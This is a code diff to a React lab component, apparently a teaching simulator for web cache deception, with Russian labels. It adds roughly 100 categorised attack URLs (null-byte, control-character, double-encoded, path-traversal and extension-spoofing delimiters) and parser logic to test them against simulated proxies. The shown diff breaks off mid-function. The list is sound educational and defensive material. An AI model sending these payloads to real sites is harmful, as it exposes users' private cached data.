@@ -1,6 +1,6 @@
 'use client'
 
-import { useState, useCallback, useRef, useEffect } from 'react'
+import { useState, useCallback, useRef, useEffect, useMemo } from 'react'
 import { Button } from '@/components/ui/button'
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
 import { Input } from '@/components/ui/input'
@@ -30,6 +30,11 @@ import {
   XCircle,
   ChevronDown,
   User,
+  LayoutGrid,
+  Filter,
+  Beaker,
+  Crosshair,
+  Target,
 } from 'lucide-react'
 
 /* ─────────────────────── types ─────────────────────── */
@@ -77,6 +82,17 @@ interface TerminalLine {
   type: 'info' | 'request' | 'response' | 'cache' | 'backend' | 'error' | 'success' | 'warn'
   text: string
   delay?: number
+}
+
+interface AttackVariant {
+  url: string
+  label: string
+  category: 'basic' | 'delimiter' | 'encoding' | 'path-manipulation' | 'double-encoding' | 'extension-spoofing' | 'query-based' | 'advanced'
+  delimiter: string
+  extension: string
+  route: string
+  description: string
+  severity: 'critical' | 'high' | 'medium' | 'low' | 'safe'
 }
 
 /* ─────────────────────── data ─────────────────────── */
@@ -1181,13 +1197,123 @@ public class AccountController : ControllerBase
 //        благодаря строгому роутингу и отклонению спецсимволов`,
 }
 
-const EXAMPLE_URLS = [
-  { url: '/account/home', label: 'Обычный запрос', vulnerable: false },
-  { url: '/account/home%0f.css', label: 'WCD с %0f', vulnerable: true },
-  { url: '/api/user%00.js', label: 'WCD с null-byte', vulnerable: true },
-  { url: '/profile;admin.css', label: 'WCD с ;', vulnerable: true },
-  { url: '/dashboard%0a.png', label: 'WCD с %0a', vulnerable: true },
-  { url: '/settings%0d.css', label: 'WCD с %0d', vulnerable: true },
+const ATTACK_VARIANTS: AttackVariant[] = [
+  // ── basic (6) ──────────────────────────────────────────
+  { url: '/account/home', label: 'Обычный /account/home', category: 'basic', delimiter: '—', extension: '—', route: '/account/home', description: 'Стандартный запрос к аккаунту без разделителей и расширений. Не представляет угрозы.', severity: 'safe' },
+  { url: '/api/user', label: 'Обычный /api/user', category: 'basic', delimiter: '—', extension: '—', route: '/api/user', description: 'Стандартный API-запрос данных пользователя. Безопасный запрос.', severity: 'safe' },
+  { url: '/profile', label: 'Обычный /profile', category: 'basic', delimiter: '—', extension: '—', route: '/profile', description: 'Стандартный запрос профиля. Не вызывает расхождения.', severity: 'safe' },
+  { url: '/dashboard', label: 'Обычный /dashboard', category: 'basic', delimiter: '—', extension: '—', route: '/dashboard', description: 'Стандартный запрос панели управления. Безопасный.', severity: 'safe' },
+  { url: '/settings', label: 'Обычный /settings', category: 'basic', delimiter: '—', extension: '—', route: '/settings', description: 'Стандартный запрос настроек. Не вызывает кэширование.', severity: 'safe' },
+  { url: '/account/home.css', label: '/account/home.css', category: 'basic', delimiter: '—', extension: 'css', route: '/account/home.css', description: 'Запрос с расширением .css, но маршрут не существует — вернёт 404.', severity: 'safe' },
+
+  // ── delimiter (36) ─────────────────────────────────────
+  { url: '/account/home%0f.css', label: '%0f + .css → /account/home', category: 'delimiter', delimiter: '%0f', extension: 'css', route: '/account/home', description: 'Невидимый символ Shift In между путём и расширением. Прокси видит .css, backend обрезает до маршрута.', severity: 'critical' },
+  { url: '/account/home%0f.js', label: '%0f + .js → /account/home', category: 'delimiter', delimiter: '%0f', extension: 'js', route: '/account/home', description: 'Разделитель %0f с расширением .js. Прокси кэширует как JavaScript-файл.', severity: 'critical' },
+  { url: '/account/home%0f.png', label: '%0f + .png → /account/home', category: 'delimiter', delimiter: '%0f', extension: 'png', route: '/account/home', description: 'Разделитель %0f с расширением .png. Прокси кэширует как изображение.', severity: 'critical' },
+  { url: '/api/user%0f.css', label: '%0f + .css → /api/user', category: 'delimiter', delimiter: '%0f', extension: 'css', route: '/api/user', description: 'Разделитель %0f на API-маршруте. Кэш сохранит JSON-ответ как CSS.', severity: 'critical' },
+  { url: '/api/user%0f.js', label: '%0f + .js → /api/user', category: 'delimiter', delimiter: '%0f', extension: 'js', route: '/api/user', description: 'Разделитель %0f с .js на API-маршруте. API-данные закэшированы как JS.', severity: 'critical' },
+  { url: '/profile%0f.css', label: '%0f + .css → /profile', category: 'delimiter', delimiter: '%0f', extension: 'css', route: '/profile', description: 'Разделитель %0f на профиле. Конфиденциальные данные кэшируются как CSS.', severity: 'critical' },
+  { url: '/profile%0f.js', label: '%0f + .js → /profile', category: 'delimiter', delimiter: '%0f', extension: 'js', route: '/profile', description: 'Разделитель %0f с .js на профиле. Данные профиля закэшированы.', severity: 'critical' },
+  { url: '/dashboard%0f.css', label: '%0f + .css → /dashboard', category: 'delimiter', delimiter: '%0f', extension: 'css', route: '/dashboard', description: 'Разделитель %0f на панели управления. Кэш сохраняет данные как CSS.', severity: 'critical' },
+  { url: '/settings%0f.css', label: '%0f + .css → /settings', category: 'delimiter', delimiter: '%0f', extension: 'css', route: '/settings', description: 'Разделитель %0f на настройках. Настройки пользователя закэшированы.', severity: 'critical' },
+  { url: '/account/home%0a.css', label: '%0a + .css → /account/home', category: 'delimiter', delimiter: '%0a', extension: 'css', route: '/account/home', description: 'Символ перевода строки (%0a) между путём и расширением. Backend обрезает по \\n.', severity: 'critical' },
+  { url: '/api/user%0a.js', label: '%0a + .js → /api/user', category: 'delimiter', delimiter: '%0a', extension: 'js', route: '/api/user', description: 'Перевод строки с .js. Многие backend-фреймворки обрезают путь по \\n.', severity: 'critical' },
+  { url: '/profile%0a.css', label: '%0a + .css → /profile', category: 'delimiter', delimiter: '%0a', extension: 'css', route: '/profile', description: 'Перевод строки на профиле. Rack/Rails может обрезать путь по \\n.', severity: 'critical' },
+  { url: '/dashboard%0a.png', label: '%0a + .png → /dashboard', category: 'delimiter', delimiter: '%0a', extension: 'png', route: '/dashboard', description: 'Перевод строки с .png. Кэш сохранит дашборд как изображение.', severity: 'critical' },
+  { url: '/settings%0a.js', label: '%0a + .js → /settings', category: 'delimiter', delimiter: '%0a', extension: 'js', route: '/settings', description: 'Перевод строки с .js на настройках. Данные закэшированы как скрипт.', severity: 'critical' },
+  { url: '/account/home%0d.css', label: '%0d + .css → /account/home', category: 'delimiter', delimiter: '%0d', extension: 'css', route: '/account/home', description: 'Возврат каретки (%0d). Некоторые фреймворки обрезают путь по \\r.', severity: 'critical' },
+  { url: '/api/user%0d.js', label: '%0d + .js → /api/user', category: 'delimiter', delimiter: '%0d', extension: 'js', route: '/api/user', description: 'Возврат каретки с .js. Аналогично %0a, но реже распознаётся backend-ом.', severity: 'critical' },
+  { url: '/profile%0d.css', label: '%0d + .css → /profile', category: 'delimiter', delimiter: '%0d', extension: 'css', route: '/profile', description: 'Возврат каретки на профиле. Может обходить нормализацию URL.', severity: 'critical' },
+  { url: '/account/home%0d.js', label: '%0d + .js → /account/home', category: 'delimiter', delimiter: '%0d', extension: 'js', route: '/account/home', description: 'Возврат каретки с .js. Расхождение между кэшем и сервером.', severity: 'critical' },
+  { url: '/account/home%00.css', label: '%00 + .css → /account/home', category: 'delimiter', delimiter: '%00', extension: 'css', route: '/account/home', description: 'Null-байт — один из самых опасных разделителей. Многие языки обрезают строку по \\0.', severity: 'critical' },
+  { url: '/api/user%00.js', label: '%00 + .js → /api/user', category: 'delimiter', delimiter: '%00', extension: 'js', route: '/api/user', description: 'Null-байт с .js. C-основанные фреймворки обрезают путь по null.', severity: 'critical' },
+  { url: '/profile%00.css', label: '%00 + .css → /profile', category: 'delimiter', delimiter: '%00', extension: 'css', route: '/profile', description: 'Null-байт на профиле. Python, PHP, Ruby обрезают по \\0.', severity: 'critical' },
+  { url: '/dashboard%00.png', label: '%00 + .png → /dashboard', category: 'delimiter', delimiter: '%00', extension: 'png', route: '/dashboard', description: 'Null-байт с .png. Дашборд закэширован как изображение.', severity: 'critical' },
+  { url: '/settings%00.css', label: '%00 + .css → /settings', category: 'delimiter', delimiter: '%00', extension: 'css', route: '/settings', description: 'Null-байт на настройках. Утечка конфиденциальных данных.', severity: 'critical' },
+  { url: '/account/home;.css', label: '; + .css → /account/home', category: 'delimiter', delimiter: ';', extension: 'css', route: '/account/home', description: 'Точка с запятой — matrix-параметры в Spring/Java. Обрезается при маршрутизации.', severity: 'critical' },
+  { url: '/api/user;.js', label: '; + .js → /api/user', category: 'delimiter', delimiter: ';', extension: 'js', route: '/api/user', description: 'Точка с запятой с .js. Spring MVC игнорирует matrix-параметры.', severity: 'critical' },
+  { url: '/profile;.css', label: '; + .css → /profile', category: 'delimiter', delimiter: ';', extension: 'css', route: '/profile', description: 'Точка с запятой на профиле. Прокси видит .css и кэширует.', severity: 'critical' },
+  { url: '/dashboard;.png', label: '; + .png → /dashboard', category: 'delimiter', delimiter: ';', extension: 'png', route: '/dashboard', description: 'Точка с запятой с .png. Дашборд закэширован через matrix-параметр.', severity: 'critical' },
+  { url: '/account/home%1f.css', label: '%1f + .css → /account/home', category: 'delimiter', delimiter: '%1f', extension: 'css', route: '/account/home', description: 'Unit Separator (%1f). Управляющий символ, может обрезаться backend-ом.', severity: 'critical' },
+  { url: '/account/home%0b.css', label: '%0b + .css → /account/home', category: 'delimiter', delimiter: '%0b', extension: 'css', route: '/account/home', description: 'Vertical Tab (%0b). Редкий разделитель, обрезается некоторыми парсерами URL.', severity: 'critical' },
+  { url: '/account/home%0c.js', label: '%0c + .js → /account/home', category: 'delimiter', delimiter: '%0c', extension: 'js', route: '/account/home', description: 'Form Feed (%0c). Управляющий символ, может быть проигнорирован backend-ом.', severity: 'critical' },
+  { url: '/api/user%09.css', label: '%09 + .css → /api/user', category: 'delimiter', delimiter: '%09', extension: 'css', route: '/api/user', description: 'Tab (%09). Некоторые парсеры URL обрезают путь по табуляции.', severity: 'critical' },
+  { url: '/profile%23.css', label: '# + .css → /profile', category: 'delimiter', delimiter: '%23', extension: 'css', route: '/profile', description: 'Символ # (фрагмент). Может быть интерпретирован как начало якоря или разделитель.', severity: 'critical' },
+  { url: '/dashboard%3F.png', label: '? + .png → /dashboard', category: 'delimiter', delimiter: '%3F', extension: 'png', route: '/dashboard', description: 'Символ ? (query-разделитель). Закодированный вопросительный знак в пути.', severity: 'critical' },
+  { url: '/settings%0f.png', label: '%0f + .png → /settings', category: 'delimiter', delimiter: '%0f', extension: 'png', route: '/settings', description: 'Разделитель %0f с .png на настройках. Изображение с утечкой данных.', severity: 'critical' },
+  { url: '/account/home%0f.svg', label: '%0f + .svg → /account/home', category: 'delimiter', delimiter: '%0f', extension: 'svg', route: '/account/home', description: 'Разделитель %0f с SVG. Прокси кэширует как векторную графику.', severity: 'critical' },
+
+  // ── encoding (12) ──────────────────────────────────────
+  { url: '/account/home%uff0f.css', label: 'Unicode fullwidth / + .css', category: 'encoding', delimiter: '%uff0f', extension: 'css', route: '/account/home', description: 'Fullwidth слеш (U+FF0F). Некоторые серверы нормализуют Unicode-символы в ASCII.', severity: 'high' },
+  { url: '/api/user%u002f.js', label: 'Unicode escape / + .js', category: 'encoding', delimiter: '%u002f', extension: 'js', route: '/api/user', description: 'Unicode-экранирование слеша. Может быть декодировано на стороне сервера.', severity: 'high' },
+  { url: '/account/home%c0%af.css', label: 'Overlong UTF-8 / + .css', category: 'encoding', delimiter: '%c0%af', extension: 'css', route: '/account/home', description: 'Overlong кодировка слеша (2 байта вместо 1). Обходит простые фильтры WAF.', severity: 'high' },
+  { url: '/profile%e0%80%af.js', label: 'Overlong UTF-8 / + .js', category: 'encoding', delimiter: '%e0%80%af', extension: 'js', route: '/profile', description: 'Трёхбайтовая overlong кодировка слеша. Редко проверяется фильтрами.', severity: 'high' },
+  { url: '/dashboard%c0%ae.css', label: 'Overlong UTF-8 . + .css', category: 'encoding', delimiter: '%c0%ae', extension: 'css', route: '/dashboard', description: 'Overlong кодировка точки. Может обходить проверки расширений.', severity: 'high' },
+  { url: '/account/home%5c.css', label: 'Обратный слеш + .css', category: 'encoding', delimiter: '%5c', extension: 'css', route: '/account/home', description: 'Обратный слеш вместо прямого. Windows-серверы могут нормализовать \\ в /.', severity: 'high' },
+  { url: '/profile%e2%80%ae.css', label: 'RTL override + .css', category: 'encoding', delimiter: '%e2%80%ae', extension: 'css', route: '/profile', description: 'Right-To-Left Override (U+202E). Может изменить визуальное восприятие URL.', severity: 'medium' },
+  { url: '/account/home%20.css', label: 'Пробел + .css', category: 'encoding', delimiter: '%20', extension: 'css', route: '/account/home', description: 'Закодированный пробел между путём и расширением. Может обрезаться backend-ом.', severity: 'high' },
+  { url: '/dashboard%bb.css', label: '» + .css', category: 'encoding', delimiter: '%bb', extension: 'css', route: '/dashboard', description: 'Right double angle bracket. Нестандартный символ в пути URL.', severity: 'medium' },
+  { url: '/api/user%b7.js', label: '· + .js', category: 'encoding', delimiter: '%b7', extension: 'js', route: '/api/user', description: 'Middle dot (·). Может интерпретироваться как разделитель на некоторых серверах.', severity: 'medium' },
+  { url: '/settings%a0.css', label: 'NBSP + .css', category: 'encoding', delimiter: '%a0', extension: 'css', route: '/settings', description: 'Неразрывный пробел (non-breaking space). Парсеры могут обрезать по нему.', severity: 'high' },
+  { url: '/account/home%2f%2e.css', label: 'Кодир. / и . + .css', category: 'encoding', delimiter: '%2f%2e', extension: 'css', route: '/account/home', description: 'Закодированные слеш и точка. Некоторые прокси не декодируют перед проверкой.', severity: 'high' },
+
+  // ── path-manipulation (10) ─────────────────────────────
+  { url: '/../account/home.css', label: '/../ + .css', category: 'path-manipulation', delimiter: '/../', extension: 'css', route: '/account/home', description: 'Обход пути с ../. Прокси может не нормализовать путь перед проверкой расширения.', severity: 'medium' },
+  { url: '/account/./home%0f.css', label: './ + %0f + .css', category: 'path-manipulation', delimiter: '%0f', extension: 'css', route: '/account/home', description: 'Текущая директория (./) + разделитель %0f. Двойное искажение пути.', severity: 'medium' },
+  { url: '//account/home.css', label: '// + .css', category: 'path-manipulation', delimiter: '//', extension: 'css', route: '/account/home', description: 'Двойной слеш в начале. Некоторые прокси обрабатывают // как /, но кэш-ключи различаются.', severity: 'medium' },
+  { url: '/account/home/..%0f.css', label: '.. + %0f + .css', category: 'path-manipulation', delimiter: '%0f', extension: 'css', route: '/account/home', description: 'Path traversal с %0f. Комбинация ../ и разделителя для обхода фильтров.', severity: 'medium' },
+  { url: '/./account/home.css', label: '/./ prefix + .css', category: 'path-manipulation', delimiter: '/./', extension: 'css', route: '/account/home', description: 'Префикс текущей директории. Нормализация может убрать ./, но кэш-ключ останется с ним.', severity: 'medium' },
+  { url: '/account//home%0f.css', label: '// в пути + %0f.css', category: 'path-manipulation', delimiter: '%0f', extension: 'css', route: '/account/home', description: 'Двойной слеш внутри пути + разделитель. Несколько аномалий в одном URL.', severity: 'medium' },
+  { url: '/account/home/.css', label: '/.css (точка-префикс)', category: 'path-manipulation', delimiter: '/', extension: 'css', route: '/account/home', description: 'Точка перед css без разделителя. Создаёт путь /home/.css — может совпасть с маршрутом.', severity: 'medium' },
+  { url: '/..%252faccount/home.css', label: 'Двойное кодир. ../', category: 'path-manipulation', delimiter: '%252f', extension: 'css', route: '/account/home', description: 'Двойное кодирование path traversal. Первая декодировка даёт /../, вторая — обход.', severity: 'medium' },
+  { url: '/account/home%2f.css', label: 'Закодир. слеш + .css', category: 'path-manipulation', delimiter: '%2f', extension: 'css', route: '/account/home', description: 'Закодированный слеш (%2f) перед .css. Прокси может не декодировать перед проверкой.', severity: 'medium' },
+  { url: '/account/home%2e.css', label: 'Закодир. точка + .css', category: 'path-manipulation', delimiter: '%2e', extension: 'css', route: '/account/home', description: 'Закодированная точка (%2e). Прокси видит .css, но путь содержит %2e а не реальную точку.', severity: 'medium' },
+
+  // ── double-encoding (10) ───────────────────────────────
+  { url: '/account/home%250f.css', label: '%250f (2x %0f) + .css', category: 'double-encoding', delimiter: '%250f', extension: 'css', route: '/account/home', description: 'Двойное кодирование %0f. Первый decode даёт %0f, второй — управляющий символ.', severity: 'high' },
+  { url: '/api/user%2500.js', label: '%2500 (2x %00) + .js', category: 'double-encoding', delimiter: '%2500', extension: 'js', route: '/api/user', description: 'Двойное кодирование null-байта. Обходит фильтры, декодирующие только один раз.', severity: 'high' },
+  { url: '/profile%250a.css', label: '%250a (2x %0a) + .css', category: 'double-encoding', delimiter: '%250a', extension: 'css', route: '/profile', description: 'Двойное кодирование перевода строки. После первого decode — %0a, после второго — \\n.', severity: 'high' },
+  { url: '/dashboard%250d.png', label: '%250d (2x %0d) + .png', category: 'double-encoding', delimiter: '%250d', extension: 'png', route: '/dashboard', description: 'Двойное кодирование возврата каретки. Обходит WAF и базовые фильтры.', severity: 'high' },
+  { url: '/account/home%252f.css', label: '%252f (2x /) + .css', category: 'double-encoding', delimiter: '%252f', extension: 'css', route: '/account/home', description: 'Двойное кодирование слеша. Первый decode даёт %2f, второй — /. Создаёт вложенный путь.', severity: 'high' },
+  { url: '/api/user%252e.js', label: '%252e (2x .) + .js', category: 'double-encoding', delimiter: '%252e', extension: 'js', route: '/api/user', description: 'Двойное кодирование точки. Может создать расширение файла после двойного декодирования.', severity: 'high' },
+  { url: '/settings%250f.css', label: '%250f + .css → /settings', category: 'double-encoding', delimiter: '%250f', extension: 'css', route: '/settings', description: 'Двойное кодирование %0f на настройках. Настройки пользователя закэшированы.', severity: 'high' },
+  { url: '/account/home%250a.js', label: '%250a + .js → /account/home', category: 'double-encoding', delimiter: '%250a', extension: 'js', route: '/account/home', description: 'Двойное кодирование %0a с .js. Аккаунт закэширован как JS-файл.', severity: 'high' },
+  { url: '/profile%2500.png', label: '%2500 + .png → /profile', category: 'double-encoding', delimiter: '%2500', extension: 'png', route: '/profile', description: 'Двойное кодирование null + .png. Профиль закэширован как изображение.', severity: 'high' },
+  { url: '/dashboard%252f.css', label: '%252f + .css → /dashboard', category: 'double-encoding', delimiter: '%252f', extension: 'css', route: '/dashboard', description: 'Двойное кодирование слеша на дашборде. Расхождение при двойном декодировании.', severity: 'high' },
+
+  // ── extension-spoofing (8) ─────────────────────────────
+  { url: '/account/home.css%00', label: '.css%00 на /account/home', category: 'extension-spoofing', delimiter: '%00', extension: 'css', route: '/account/home', description: 'Null-байт после расширения .css. Backend может обрезать по null, видя /account/home.css.', severity: 'high' },
+  { url: '/api/user.js?v=1', label: '.js?v=1 на /api/user', category: 'extension-spoofing', delimiter: '?', extension: 'js', route: '/api/user', description: 'Query-параметр после расширения .js. Прокси кэширует, query влияет на ключ.', severity: 'low' },
+  { url: '/profile.png%0f', label: '.png%0f на /profile', category: 'extension-spoofing', delimiter: '%0f', extension: 'png', route: '/profile', description: 'Разделитель после расширения .png. Прокси видит .png, backend обрезает %0f.', severity: 'medium' },
+  { url: '/dashboard.css%0a', label: '.css%0a на /dashboard', category: 'extension-spoofing', delimiter: '%0a', extension: 'css', route: '/dashboard', description: 'Перевод строки после .css. Backend может обрезать путь по \\n.', severity: 'medium' },
+  { url: '/account/home.css%0d', label: '.css%0d на /account/home', category: 'extension-spoofing', delimiter: '%0d', extension: 'css', route: '/account/home', description: 'Возврат каретки после .css. Расширение видимо для кэша, но backend обрезает.', severity: 'medium' },
+  { url: '/settings.js#frag', label: '.js#frag на /settings', category: 'extension-spoofing', delimiter: '#', extension: 'js', route: '/settings', description: 'Фрагмент после .js. Браузер не отправляет #frag, но прокси может увидеть в полном URL.', severity: 'low' },
+  { url: '/api/user.css%3b', label: '.css; на /api/user', category: 'extension-spoofing', delimiter: '%3b', extension: 'css', route: '/api/user', description: 'Точка с запятой после .css. Spring интерпретирует ; как matrix-параметр.', severity: 'medium' },
+  { url: '/account/home.css%09', label: '.css%09 на /account/home', category: 'extension-spoofing', delimiter: '%09', extension: 'css', route: '/account/home', description: 'Tab после расширения .css. Backend может обрезать путь по табуляции.', severity: 'medium' },
+
+  // ── query-based (8) ────────────────────────────────────
+  { url: '/account/home?.css', label: '?.css на /account/home', category: 'query-based', delimiter: '?', extension: 'css', route: '/account/home', description: 'Query-строка начинается с .css. Прокси может проверить расширение в query.', severity: 'low' },
+  { url: '/api/user?x=.css', label: '?x=.css на /api/user', category: 'query-based', delimiter: '?', extension: 'css', route: '/api/user', description: 'Параметр запроса содержит .css. Некоторые прокси кэшируют по расширению в query.', severity: 'low' },
+  { url: '/profile?.js', label: '?.js на /profile', category: 'query-based', delimiter: '?', extension: 'js', route: '/profile', description: 'Query-строка с .js. Редко кэшируется, но возможно при ошибочной конфигурации.', severity: 'low' },
+  { url: '/dashboard?x=.png', label: '?x=.png на /dashboard', category: 'query-based', delimiter: '?', extension: 'png', route: '/dashboard', description: 'Параметр с расширением .png. Кэш-ключ может включать query-строку.', severity: 'low' },
+  { url: '/settings?.css&v=1', label: '?.css&v=1 на /settings', category: 'query-based', delimiter: '?', extension: 'css', route: '/settings', description: 'Query с .css и дополнительным параметром. Cache-busting может мешать.', severity: 'low' },
+  { url: '/account/home?.css%0f', label: '?.css%0f на /account/home', category: 'query-based', delimiter: '?', extension: 'css', route: '/account/home', description: 'Query с расширением и разделителем. Комбинация query и delimiter техник.', severity: 'low' },
+  { url: '/api/user?format=.js', label: '?format=.js на /api/user', category: 'query-based', delimiter: '?', extension: 'js', route: '/api/user', description: 'Параметр format с расширением. Некоторые фреймворки используют format для контента.', severity: 'low' },
+  { url: '/profile?_.css', label: '?_.css на /profile', category: 'query-based', delimiter: '?', extension: 'css', route: '/profile', description: 'Подчёркивание с расширением .css в query. Техника cache-bust с расширением.', severity: 'low' },
+
+  // ── advanced (12) ──────────────────────────────────────
+  { url: '/account/home%0f.css?x=1', label: '%0f + .css + query', category: 'advanced', delimiter: '%0f', extension: 'css', route: '/account/home', description: 'Комбинация разделителя, расширения и query. Query может изменить ключ кэша.', severity: 'critical' },
+  { url: '/api/user%00.js#frag', label: '%00 + .js + fragment', category: 'advanced', delimiter: '%00', extension: 'js', route: '/api/user', description: 'Null-байт + .js + фрагмент. Тройная комбинация для обхода фильтров.', severity: 'critical' },
+  { url: '/profile;matrix.css%0f', label: '; + .css + %0f', category: 'advanced', delimiter: ';', extension: 'css', route: '/profile', description: 'Matrix-параметр и разделитель %0f. Двойной разделитель в одном URL.', severity: 'critical' },
+  { url: '/dashboard%0a.png?cb=123', label: '%0a + .png + cache-bust', category: 'advanced', delimiter: '%0a', extension: 'png', route: '/dashboard', description: 'Перевод строки + .png + cache-busting параметр. Query влияет на ключ кэша.', severity: 'critical' },
+  { url: '/settings%0d.css;x=1', label: '%0d + .css + matrix', category: 'advanced', delimiter: '%0d', extension: 'css', route: '/settings', description: 'Возврат каретки + .css + matrix-параметр. Spring проигнорирует ;x=1.', severity: 'critical' },
+  { url: '/account/home%0f.css/../../', label: '%0f + path traversal', category: 'advanced', delimiter: '%0f', extension: 'css', route: '/account/home', description: 'Разделитель + path traversal. Глубокое искажение пути для обхода всех фильтров.', severity: 'critical' },
+  { url: '/api/user%250f.css%00', label: '2x кодир. + null', category: 'advanced', delimiter: '%250f', extension: 'css', route: '/api/user', description: 'Двойное кодирование + null-байт. Тройное искажение: двойной decode + обрезка по null.', severity: 'high' },
+  { url: '/profile%0f.css?X-Cache=hit', label: '%0f + cache key poison', category: 'advanced', delimiter: '%0f', extension: 'css', route: '/profile', description: 'Разделитель + попытка отравления ключа кэша через заголовок в query.', severity: 'critical' },
+  { url: '/dashboard;.js?_=.css', label: '; + query с .css', category: 'advanced', delimiter: ';', extension: 'js', route: '/dashboard', description: 'Matrix-параметр + .js + query с .css. Конкурирующие расширения в URL.', severity: 'high' },
+  { url: '/account/home%0f.css?_nocache=1', label: '%0f + nocache bypass', category: 'advanced', delimiter: '%0f', extension: 'css', route: '/account/home', description: 'Разделитель + попытка обхода кэша. Параметр _nocache может быть проигнорирован прокси.', severity: 'critical' },
+  { url: '/settings%0f.css?utm_source=x', label: '%0f + tracking param', category: 'advanced', delimiter: '%0f', extension: 'css', route: '/settings', description: 'Разделитель + UTM-параметр. Tracking-параметры могут создавать уникальные ключи кэша.', severity: 'critical' },
+  { url: '/api/user%00.js?callback=cb', label: '%00 + JSONP callback', category: 'advanced', delimiter: '%00', extension: 'js', route: '/api/user', description: 'Null-байт + JSONP-стиль callback. Ответ может быть обёрнут в функцию и закэширован.', severity: 'critical' },
 ]
 
 /* ─────────────────────── parser ─────────────────────── */
@@ -1230,6 +1356,25 @@ function parseUrlWithConfigs(
     '%0d': '\r',
     '%00': '\0',
     ';': ';',
+    '%1f': '\x1f',
+    '%0b': '\x0b',
+    '%0c': '\x0c',
+    '%09': '\t',
+    '%23': '#',
+    '%3f': '?',
+    '%20': ' ',
+    '%5c': '\\',
+  }
+
+  // Double-encoded delimiter map: the key is the double-encoded form,
+  // the value is the single-encoded inner delimiter (used for backend recognition check)
+  const doubleEncodedMap: Record<string, string> = {
+    '%250f': '%0f',
+    '%2500': '%00',
+    '%250a': '%0a',
+    '%250d': '%0d',
+    '%252f': '%2f',
+    '%252e': '%2e',
   }
 
   for (const [encoded, char] of Object.entries(delimiterMap)) {
@@ -1239,18 +1384,49 @@ function parseUrlWithConfigs(
     }
   }
 
+  // Check for double-encoded delimiters if no single-encoded delimiter found
+  let isDoubleEncoded = false
+  if (!activeDelimiter) {
+    for (const [doubleEncoded, singleEncoded] of Object.entries(doubleEncodedMap)) {
+      if (original.toLowerCase().includes(doubleEncoded.toLowerCase())) {
+        activeDelimiter = doubleEncoded
+        isDoubleEncoded = true
+        // For double-encoded, after first decode we get the single-encoded form
+        // The backend would need to decode again to recognize the delimiter
+        break
+      }
+    }
+  }
+
   if (activeDelimiter && backendConfig.ignoreAfterDelimiter) {
-    const delimChar = delimiterMap[activeDelimiter]
-    if (delimChar === ';') {
-      backendPath = decoded.split(';')[0]
+    if (isDoubleEncoded) {
+      // For double-encoded delimiters, the first decode gives the single-encoded form
+      // which acts as the split point
+      const innerDelim = doubleEncodedMap[activeDelimiter]
+      if (innerDelim) {
+        backendPath = decoded.split(innerDelim)[0]
+      }
     } else {
-      backendPath = decoded.split(delimChar)[0]
+      const delimChar = delimiterMap[activeDelimiter]
+      if (delimChar === ';') {
+        backendPath = decoded.split(';')[0]
+      } else {
+        backendPath = decoded.split(delimChar)[0]
+      }
     }
   }
 
   // Check if backend recognizes this delimiter
-  const backendRecognizesDelimiter =
+  let backendRecognizesDelimiter =
     activeDelimiter !== null && backendConfig.stripDelimiters.includes(activeDelimiter.toLowerCase())
+
+  // For double-encoded delimiters, check if the inner single-encoded delimiter is recognized
+  if (isDoubleEncoded && activeDelimiter && !backendRecognizesDelimiter) {
+    const innerDelim = doubleEncodedMap[activeDelimiter]
+    if (innerDelim) {
+      backendRecognizesDelimiter = backendConfig.stripDelimiters.includes(innerDelim.toLowerCase())
+    }
+  }
 
   const backendIsStatic = false
   const routeMap: Record<string, string> = {
@@ -1267,7 +1443,11 @@ function parseUrlWithConfigs(
     : `HTTP 404 Not Found\n\n{ "error": "Route not found" }`
 
   let backendInterpretation: string
-  if (activeDelimiter && backendRecognizesDelimiter) {
+  if (isDoubleEncoded && activeDelimiter && backendRecognizesDelimiter) {
+    backendInterpretation = `Двойное кодирование ${activeDelimiter}. После первого decode: ${doubleEncodedMap[activeDelimiter]}. После второго decode — разделитель распознан. Путь обрезан до "${backendPath}".`
+  } else if (isDoubleEncoded && activeDelimiter && !backendRecognizesDelimiter) {
+    backendInterpretation = `Двойное кодирование ${activeDelimiter}. Внутренний разделитель ${doubleEncodedMap[activeDelimiter]} НЕ распознан backend (${backendConfig.type}). Полный путь: "${decoded}".`
+  } else if (activeDelimiter && backendRecognizesDelimiter) {
     backendInterpretation = `Разделитель ${activeDelimiter} распознан. Путь обрезан до "${backendPath}". Расширение .${rawExtension} проигнорировано.`
   } else if (activeDelimiter && !backendRecognizesDelimiter) {
     backendInterpretation = `Разделитель ${activeDelimiter} НЕ распознан данным backend (${backendConfig.type}). Полный путь: "${decoded}".`
@@ -1619,6 +1799,16 @@ export function LabView() {
   const [sandboxTerminalLines, setSandboxTerminalLines] = useState<TerminalLine[]>([])
   const [sandboxCacheEntries, setSandboxCacheEntries] = useState<Map<string, { data: string; ttl: number }>>(new Map())
 
+  // Experiments state
+  const [activeTab, setActiveTab] = useState('config')
+  const [selectedCategory, setSelectedCategory] = useState<string>('all')
+  const [selectedVariant, setSelectedVariant] = useState<AttackVariant | null>(null)
+  const [batchResults, setBatchResults] = useState<Record<string, boolean> | null>(null)
+  const [isBatchRunning, setIsBatchRunning] = useState(false)
+  const [builderRoute, setBuilderRoute] = useState('/account/home')
+  const [builderDelimiter, setBuilderDelimiter] = useState('')
+  const [builderExtension, setBuilderExtension] = useState('')
+
   const proxyConfig = PROXY_CONFIGS[proxyType]
   const backendConfig = BACKEND_CONFIGS[backendType]
 
@@ -1780,6 +1970,62 @@ export function LabView() {
     setSandboxCacheEntries(new Map())
   }
 
+  // ── Experiments helpers ──
+  const filteredVariants = ATTACK_VARIANTS.filter(v =>
+    selectedCategory === 'all' ? true : v.category === selectedCategory
+  )
+
+  const categoryCounts = ATTACK_VARIANTS.reduce<Record<string, number>>((acc, v) => {
+    acc[v.category] = (acc[v.category] || 0) + 1
+    return acc
+  }, {})
+
+  const buildCustomUrl = useCallback(() => {
+    return `${builderRoute}${builderDelimiter}${builderExtension ? '.' + builderExtension : ''}`
+  }, [builderRoute, builderDelimiter, builderExtension])
+
+  const runBatchTest = useCallback(() => {
+    setIsBatchRunning(true)
+    setBatchResults(null)
+    const results: Record<string, boolean> = {}
+    const variantsToTest = selectedCategory === 'all'
+      ? ATTACK_VARIANTS
+      : ATTACK_VARIANTS.filter(v => v.category === selectedCategory)
+
+    let idx = 0
+    const testNext = () => {
+      if (idx >= variantsToTest.length) {
+        setIsBatchRunning(false)
+        return
+      }
+      const variant = variantsToTest[idx]
+      const parsed = parseUrlWithConfigs(variant.url, proxyConfig, backendConfig)
+      results[variant.url] = parsed.isVulnerable
+      setBatchResults({ ...results })
+      idx++
+      setTimeout(testNext, 30)
+    }
+    testNext()
